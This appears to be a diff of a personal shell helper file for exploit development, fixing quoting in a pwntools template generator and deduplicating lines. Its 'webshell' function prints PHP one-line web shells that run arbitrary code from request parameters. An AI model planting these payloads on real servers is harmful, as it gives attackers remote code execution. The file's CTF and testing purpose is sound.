@@ -8,7 +8,7 @@ alias asmarm="arm-linux-gnueabi-as -aln -o /dev/null"
 alias asmaarch64="aarch64-linux-gnu-as -aln -o /dev/null"
 alias lddd="LD_TRACE_LOADED_OBJECTS=1"
 alias LOCALLIB="LD_LIBRARY_PATH=./"
-alias NOASLR="setarch `uname -m` -R "
+alias NOASLR="setarch `uname -m` -R"
 
 aslr()
 {
@@ -105,18 +105,18 @@ pwn()
 {
     if [ $# -eq 0 ]; then
         echo "[!] Usage: pwn <filename>"
-    elif [ -f $1".py" ]; then
-        echo $1".py already exists!"
+    elif [ -f "$1.py" ]; then
+        echo "$1.py already exists!"
     else
         echo "#!/usr/bin/env python
 # encoding: utf-8
 
 from pwn import *   # pip install pwntools
 
-r = remote("localhost", 4000);
+r = remote(\"localhost\", 4000);
 
 
-r.interactive()" > 1.py
+r.interactive()" > "$1.py"
     fi
 }
 
@@ -140,7 +140,6 @@ shellcode()
 
 webshell()
 {
-    echo "<?php $_GET[a]($_GET[b]);?>"
     echo "<?php $_GET[a]($_GET[b]);?>"
     echo "<?php eval($_POST[c]);?>"
     
